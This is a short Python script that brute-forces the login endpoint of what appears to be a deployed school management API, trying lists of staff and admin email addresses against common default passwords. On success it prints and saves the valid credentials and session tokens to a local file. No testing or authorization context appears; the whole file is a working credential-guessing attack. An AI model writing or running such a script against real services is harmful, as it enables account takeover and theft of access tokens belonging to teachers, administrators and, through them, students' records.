import requests

BASE = "https://edusphere-erp.onrender.com/api/v1"

emails = [
    "edusphereteacher@gmail.com",
    "priya.joshi@edusphere.edu",
    "aanya.verma@edusphere.edu",
    "vijay.wilson@edusphere.edu",
    "teacher1@edusphere.edu",
    "teacher2@edusphere.edu",
    "teacher1@edusphere.com",
    "admin@edusphere.edu",
    "edusphereadmin@gmail.com",
]

passwords = ["edusphere", "Teacher@123", "Teacher@2024", "Admin@2024", "Student@123", "Student@2024"]

for email in emails:
    for pw in passwords:
        try:
            r = requests.post(f"{BASE}/auth/login", json={"email": email, "password": pw}, timeout=5)
            if r.status_code == 200:
                print(f"🎉 SUCCESS: {email} / {pw}")
                data = r.json()
                print(f"  Token: {data.get('token')[:30]}...")
                with open("scratch/valid_credentials.txt", "w") as f:
                    f.write(f"{email}:{pw}:{data.get('token')}")
                break
        except Exception as e:
            print(f"Error for {email}: {e}")
